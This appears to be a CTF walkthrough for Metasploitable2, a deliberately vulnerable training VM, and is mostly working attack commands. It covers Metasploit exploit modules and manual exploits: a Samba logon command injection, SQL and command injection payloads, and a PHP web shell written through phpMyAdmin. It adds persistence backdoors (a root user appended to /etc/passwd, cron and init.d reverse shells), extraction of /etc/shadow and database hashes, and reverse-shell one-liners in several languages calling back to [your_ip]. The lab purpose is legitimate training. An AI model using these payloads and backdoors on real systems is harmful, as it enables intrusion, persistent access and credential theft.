# CTF Penetration Testing Checklist - Metasploitable2

## Target: Metasploitable2 (Ubuntu 8.04)
**Default Credentials:** msfadmin / msfadmin

---

## Phase 1: Information Gathering & Reconnaissance

### 1.1 Network Discovery
```bash
# Find target IP
netdiscover -r 192.168.1.0/24
arp-scan -l

# Ping sweep
nmap -sn 192.168.1.0/24
```

### 1.2 Initial Port Scanning
```bash
# Quick scan
nmap -sV -sC 192.168.211.134

# Full port scan
nmap -p- 192.168.211.134

# Aggressive scan
nmap -A -T4 192.168.211.134

# Version detection
nmap -sV --version-all 192.168.211.134
```

### 1.3 Comprehensive Port Scan
```bash
# All open ports with service detection
nmap -p- -sV -sC -A -T4 192.168.211.134 -oN metasploitable_scan.txt
```

### 1.4 Expected Open Ports
```
21/tcp   - FTP (vsftpd 2.3.4)
22/tcp   - SSH (OpenSSH 4.7p1)
23/tcp   - Telnet
25/tcp   - SMTP (Postfix)
53/tcp   - DNS (ISC BIND 9.4.2)
80/tcp   - HTTP (Apache 2.2.8)
111/tcp  - RPCbind
139/tcp  - NetBIOS-SSN (Samba 3.0.20)
445/tcp  - Microsoft-DS (Samba 3.0.20)
512/tcp  - exec
513/tcp  - login
514/tcp  - shell
1099/tcp - Java RMI Registry
1524/tcp - Bindshell (Ingreslock)
2049/tcp - NFS
2121/tcp - FTP (ProFTPD 1.3.1)
3306/tcp - MySQL 5.0.51a
3632/tcp - distccd v1
5432/tcp - PostgreSQL 8.3.0-8.3.7
5900/tcp - VNC (protocol 3.3)
6000/tcp - X11
6667/tcp - IRC (UnrealIRCd)
8009/tcp - AJP13 (Apache Jserv)
8180/tcp - Apache Tomcat/Coyote JSP
8787/tcp - drb (Ruby DRb RMI)
```

---

## Phase 2: Enumeration & Vulnerability Scanning

### 2.1 FTP Enumeration (Port 21 - vsftpd 2.3.4)
```bash
# Check FTP version
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 192.168.211.134

# Anonymous FTP
ftp 192.168.211.134
# Username: anonymous
# Password: anonymous

# List files
ls -la
```

**Vulnerability:** vsftpd 2.3.4 Backdoor

### 2.2 SSH Enumeration (Port 22)
```bash
# SSH version detection
nmap -p 22 --script ssh-hostkey,ssh-auth-methods 192.168.211.134

# Try default credentials
ssh msfadmin@192.168.211.134
# Password: msfadmin
```

### 2.3 Telnet Enumeration (Port 23)
```bash
# Connect via telnet
telnet 192.168.211.134

# Try default credentials
# Username: msfadmin
# Password: msfadmin
```

### 2.4 SMTP Enumeration (Port 25)
```bash
# User enumeration
nmap -p 25 --script smtp-enum-users 192.168.211.134

# SMTP commands
telnet 192.168.211.134 25
VRFY root
VRFY msfadmin
EXPN root

# Automated enumeration
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.211.134
```

### 2.5 DNS Enumeration (Port 53)
```bash
# DNS queries
nslookup
server 192.168.211.134
127.0.0.1

# Zone transfer
dig axfr @192.168.211.134
```

### 2.6 HTTP/HTTPS Enumeration (Port 80, 443, 8180)
```bash
# Web server detection
whatweb http://192.168.211.134
nikto -h http://192.168.211.134

# Directory enumeration
gobuster dir -u http://192.168.211.134 -w /usr/share/wordlists/dirb/common.txt
dirb http://192.168.211.134 /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://192.168.211.134

# Common directories found:
# /mutillidae/
# /dvwa/
# /phpMyAdmin/
# /twiki/
# /tikiwiki/
# /dav/

# Check for WebDAV
davtest -url http://192.168.211.134/dav/
cadaver http://192.168.211.134/dav/
```

### 2.7 Samba/SMB Enumeration (Port 139, 445)
```bash
# SMB version detection
nmap -p 139,445 --script smb-os-discovery 192.168.211.134

# List shares
smbclient -L //192.168.211.134 -N
smbmap -H 192.168.211.134
smbmap -H 192.168.211.134 -u anonymous

# Connect to shares
smbclient //192.168.211.134/tmp -N

# Enum4linux
enum4linux -a 192.168.211.134
enum4linux -U 192.168.211.134  # Users
enum4linux -S 192.168.211.134  # Shares
enum4linux -G 192.168.211.134  # Groups

# Samba vulnerability scan
nmap --script smb-vuln* -p 139,445 192.168.211.134
```

**Vulnerability:** Samba 3.0.20 - Username map script

### 2.8 NFS Enumeration (Port 2049)
```bash
# Show NFS exports
showmount -e 192.168.211.134

# Mount NFS share
mkdir /tmp/nfs
mount -t nfs 192.168.211.134:/ /tmp/nfs
ls -la /tmp/nfs
```

### 2.9 MySQL Enumeration (Port 3306)
```bash
# Connect to MySQL
mysql -h 192.168.211.134 -u root
# No password required

# MySQL commands
show databases;
use mysql;
select user,password from user;

# Nmap scan
nmap -p 3306 --script mysql-enum,mysql-empty-password,mysql-databases 192.168.211.134
```

### 2.10 PostgreSQL Enumeration (Port 5432)
```bash
# Connect to PostgreSQL
psql -h 192.168.211.134 -U postgres
# Try password: postgres

# List databases
\l
\c postgres
\dt
```

### 2.11 VNC Enumeration (Port 5900)
```bash
# VNC scan
nmap -p 5900 --script vnc-info 192.168.211.134

# Connect to VNC
vncviewer 192.168.211.134:5900
# Password: password (often weak/none)
```

### 2.12 DistCC Enumeration (Port 3632)
```bash
# DistCC vulnerability scan
nmap -p 3632 --script distcc-cve2004-2687 192.168.211.134
```

### 2.13 IRC Enumeration (Port 6667)
```bash
# UnrealIRCd scan
nmap -p 6667 --script irc-unrealircd-backdoor 192.168.211.134
```

### 2.14 Bindshell Detection (Port 1524)
```bash
# Connect to bindshell
nc 192.168.211.134 1524
telnet 192.168.211.134 1524
```

### 2.15 Tomcat Enumeration (Port 8180)
```bash
# Tomcat manager
http://192.168.211.134:8180/manager/html
# Credentials: tomcat/tomcat or admin/admin

# Brute force
hydra -L /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt -P /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt http-get://192.168.211.134:8180/manager/html
```

---

## Phase 3: Exploitation

### 3.1 vsftpd 2.3.4 Backdoor (Port 21)
```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 192.168.211.134
set RHOST 192.168.211.134
show options
exploit

# Commands after shell
whoami
# root
pwd
ls -la
cat /etc/passwd
cat /etc/shadow
```

### 3.2 Samba 3.0.20 - Username map script (Port 139/445)
```bash
msfconsole
search samba username
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.211.134
set payload cmd/unix/reverse
set LHOST [your_ip]
exploit

# Alternative payload
set payload cmd/unix/bind_netcat
exploit
```

**Manual Exploitation:**
```bash
smbclient //192.168.211.134/tmp
logon "/=`nohup nc -e /bin/bash [your_ip] 4444`"
```

### 3.3 Bindshell (Port 1524)
```bash
# Direct connection - instant root shell!
nc 192.168.211.134 1524
whoami
# root
```

### 3.4 UnrealIRCd Backdoor (Port 6667)
```bash
msfconsole
search unreal
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.211.134
set RHOST 192.168.211.134
set payload cmd/unix/reverse
set LHOST [your_ip]
exploit
```

### 3.5 DistCC Daemon (Port 3632)
```bash
msfconsole
search distcc
use exploit/unix/misc/distcc_exec
set RHOSTS 192.168.211.134
set payload cmd/unix/reverse
set LHOST [your_ip]
exploit
```

### 3.6 Java RMI Server (Port 1099)
```bash
msfconsole
search java_rmi
use exploit/multi/misc/java_rmi_server
set RHOSTS 192.168.211.134
set payload java/meterpreter/reverse_tcp
set LHOST [your_ip]
exploit
```

### 3.7 Tomcat Manager (Port 8180)
```bash
msfconsole
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.211.134
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set payload java/meterpreter/reverse_tcp
set LHOST [your_ip]
exploit
```

**Manual WAR Upload:**
```bash
# Generate WAR payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[your_ip] LPORT=4444 -f war > shell.war

# Start listener
nc -lvnp 4444

# Upload via Tomcat Manager
# Browse to: http://192.168.211.134:8180/manager/html
# Upload shell.war
# Access: http://192.168.211.134:8180/shell/
```

### 3.8 PostgreSQL (Port 5432)
```bash
msfconsole
use exploit/linux/postgres/postgres_payload
set RHOSTS 192.168.211.134
set USERNAME postgres
set PASSWORD postgres
set DATABASE postgres
set payload linux/x86/meterpreter/reverse_tcp
set LHOST [your_ip]
exploit
```

### 3.9 ProFTPD 1.3.1 (Port 2121)
```bash
msfconsole
search proftpd
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS 192.168.211.134
set RPORT 2121
exploit
```

### 3.10 SSH Brute Force (Port 22)
```bash
# Hydra
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.211.134

# Medusa
medusa -h 192.168.211.134 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ssh

# Metasploit
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.211.134
set USERNAME msfadmin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### 3.11 Web Application Attacks

#### 3.11.1 DVWA (Damn Vulnerable Web App)
```
URL: http://192.168.211.134/dvwa/
Credentials: admin / password

# SQL Injection
1' OR '1'='1' -- -

# Command Injection
; nc -e /bin/bash [your_ip] 4444

# File Upload
Upload PHP reverse shell
```

#### 3.11.2 Mutillidae
```
URL: http://192.168.211.134/mutillidae/
No authentication required

# SQL Injection in login
admin' OR '1'='1' -- -

# XSS
<script>alert('XSS')</script>

# Command Injection
; bash -i >& /dev/tcp/[your_ip]/4444 0>&1
```

#### 3.11.3 phpMyAdmin
```
URL: http://192.168.211.134/phpMyAdmin/
Credentials: root / (no password)

# SQL query for shell
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/shell.php"

# Access shell
http://192.168.211.134/shell.php?cmd=whoami
```

#### 3.11.4 WebDAV
```bash
# Test WebDAV
davtest -url http://192.168.211.134/dav/

# Upload shell
cadaver http://192.168.211.134/dav/
put shell.php

# Or use Metasploit
msfconsole
use exploit/unix/webapp/tikiwiki_graph_formula_exec
set RHOSTS 192.168.211.134
exploit
```

---

## Phase 4: Post-Exploitation

### 4.1 System Information
```bash
# Basic info
whoami
id
uname -a
hostname
cat /etc/issue
cat /etc/*-release

# Network info
ifconfig
ip addr
route -n
netstat -tulpn
arp -a

# User info
cat /etc/passwd
cat /etc/shadow
cat /etc/group
w
who
last
```

### 4.2 Privilege Escalation

#### 4.2.1 SUID Binaries
```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Common exploitable SUID binaries
/bin/bash
/usr/bin/nmap --interactive
```

#### 4.2.2 NFS Root Squashing
```bash
# On attacker machine
showmount -e 192.168.211.134
mkdir /tmp/nfs
mount -t nfs 192.168.211.134:/ /tmp/nfs

# Create SUID shell
cd /tmp/nfs
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/rootshell.c
gcc /tmp/rootshell.c -o /tmp/nfs/rootshell
chmod +s /tmp/nfs/rootshell

# On target
/rootshell
```

#### 4.2.3 Kernel Exploits
```bash
# Check kernel version
uname -a
# Linux metasploitable 2.6.24-16-server

# Search for exploits
searchsploit ubuntu 8.04
searchsploit linux kernel 2.6

# Common exploits
# CVE-2009-1185 - udev
# CVE-2008-0600 - vmsplice
# CVE-2009-2698 - udp_sendmsg
```

#### 4.2.4 Weak File Permissions
```bash
# Check /etc/shadow permissions
ls -la /etc/shadow

# World-writable files
find / -writable -type f 2>/dev/null
find / -perm -2 -type f 2>/dev/null

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*
```

#### 4.2.5 Sudo Misconfigurations
```bash
# Check sudo privileges
sudo -l

# If nmap with sudo
sudo nmap --interactive
!sh
```

### 4.3 Persistence

#### 4.3.1 Add Root User
```bash
# Add user to passwd
echo 'hacker:$1$hacker$TzyKlv0/R/c28RF.NHIXm0:0:0:root:/root:/bin/bash' >> /etc/passwd

# Or create new user
useradd -m hacker -s /bin/bash
passwd hacker
usermod -aG sudo hacker
```

#### 4.3.2 SSH Key
```bash
# Generate SSH key on attacker
ssh-keygen -t rsa

# Add to target
mkdir /root/.ssh
echo '[your_public_key]' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

#### 4.3.3 Cron Job Backdoor
```bash
# Add to crontab
echo '*/5 * * * * /bin/bash -c "bash -i >& /dev/tcp/[your_ip]/4444 0>&1"' >> /etc/crontab
```

#### 4.3.4 Backdoor Service
```bash
# Create backdoor script
cat > /etc/init.d/backdoor << 'EOF'
#!/bin/bash
while true; do
    bash -i >& /dev/tcp/[your_ip]/4444 0>&1
    sleep 300
done
EOF

chmod +x /etc/init.d/backdoor
update-rc.d backdoor defaults
```

### 4.4 Data Exfiltration

#### 4.4.1 Find Sensitive Files
```bash
# Search for interesting files
find / -name "*.txt" 2>/dev/null
find / -name "flag*" 2>/dev/null
find / -name "*password*" 2>/dev/null
find / -name "*.conf" 2>/dev/null

# Common flag locations
cat /root/flag.txt
cat /home/msfadmin/flag.txt
cat /var/www/flag.txt

# Database credentials
cat /var/www/html/config.php
cat /etc/mysql/my.cnf

# History files
cat ~/.bash_history
cat /root/.bash_history
cat /home/*/.bash_history
```

#### 4.4.2 Extract Password Hashes
```bash
# Copy password files
cat /etc/passwd
cat /etc/shadow

# MySQL hashes
mysql -u root -e "SELECT user,password FROM mysql.user;"

# PostgreSQL hashes
psql -U postgres -c "SELECT usename, passwd FROM pg_shadow;"
```

#### 4.4.3 Network Sniffing
```bash
# Capture traffic
tcpdump -i eth0 -w capture.pcap

# Read captured passwords
tcpdump -A -n -r capture.pcap | grep -i 'pass\|pwd\|login'
```

### 4.5 Lateral Movement
```bash
# Find other hosts
arp -a
netstat -an

# Scan internal network
for i in {1..254}; do ping -c 1 192.168.211.$i; done

# SSH to other hosts
ssh msfadmin@[target_ip]

# Copy SSH keys
cat /home/msfadmin/.ssh/id_rsa
```

---

## Quick Win Exploits (Priority Order)

### 1. Bindshell (Port 1524) - INSTANT ROOT ⚡
```bash
nc 192.168.211.134 1524
whoami  # root
```

### 2. vsftpd 2.3.4 Backdoor (Port 21) ⚡
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.211.134
exploit
```

### 3. Samba Username Map Script (Port 139/445) ⚡
```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.211.134
exploit
```

### 4. UnrealIRCd Backdoor (Port 6667) ⚡
```bash
msfconsole
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.211.134
exploit
```

### 5. Default SSH Credentials (Port 22) ⚡
```bash
ssh msfadmin@192.168.211.134
# Password: msfadmin
```

---

## Common Credentials

| Service | Username | Password |
|---------|----------|----------|
| SSH/Telnet | msfadmin | msfadmin |
| MySQL | root | (blank) |
| PostgreSQL | postgres | postgres |
| Tomcat | tomcat | tomcat |
| DVWA | admin | password |
| phpMyAdmin | root | (blank) |
| VNC | - | password |

---

## Useful Tools & Scripts

### Enumeration Tools
```bash
# AutoRecon (automated)
autorecon 192.168.211.134

# Nmap automator
nmapAutomator.sh 192.168.211.134 All

# LinPEAS (privilege escalation)
wget http://[your_ip]/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/[your_ip]/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[your_ip]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="[your_ip]";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("[your_ip]",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat
nc -e /bin/bash [your_ip] 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [your_ip] 4444 >/tmp/f
```

### Shell Upgrade
```bash
# Python PTY
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash

# Script command
/usr/bin/script -qc /bin/bash /dev/null
```

---

## CTF Flag Locations

```bash
# Common locations
/root/flag.txt
/root/root.txt
/home/msfadmin/flag.txt
/home/msfadmin/user.txt
/var/www/html/flag.txt
/tmp/flag.txt

# Search entire system
find / -name "*flag*" 2>/dev/null
find / -name "*.txt" 2>/dev/null | xargs grep -l "flag"
```

---

## Pro Tips for Metasploitable2

1. **Port 1524 = Instant Root** - Always check this first!
2. **Multiple entry points** - If one fails, try another service
3. **Weak credentials everywhere** - Try msfadmin:msfadmin first
4. **Already vulnerable** - No need to escalate, most exploits give root
5. **Web apps are goldmines** - DVWA, Mutillidae, phpMyAdmin
6. **Document everything** - Keep track of all credentials found
7. **NFS shares** - Can be mounted for easy file access
8. **MySQL/PostgreSQL** - No authentication required
9. **Multiple backdoors** - vsftpd, UnrealIRCd, bindshell all work
10. **Practice methodology** - Use this as training for real CTFs

---

## Attack Flow Diagram

```
1. Scan Ports (nmap)
   ↓
2. Enumerate Services (enum4linux, nikto, etc.)
   ↓
3. Try Quick Wins:
   - Port 1524 (bindshell) → Root Shell ✓
   - Port 21 (vsftpd backdoor) → Root Shell ✓
   - Port 139/445 (Samba) → Root Shell ✓
   ↓
4. If quick wins fail:
   - Web applications (DVWA, Mutillidae)
   - Brute force SSH/FTP
   - Database exploitation
   ↓
5. Post-Exploitation:
   - Extract /etc/shadow
   - Find flags
   - Maintain access
```

---

## Complete Walkthrough Example

```bash
# Step 1: Find target
nmap -sn 192.168.211.0/24

# Step 2: Port scan
nmap -p- -sV 192.168.211.134

# Step 3: Quick win - Bindshell
nc 192.168.211.134 1524
whoami  # root

# Step 4: Get flag
find / -name "*flag*" 2>/dev/null
cat /root/flag.txt

# Done! 🎉
```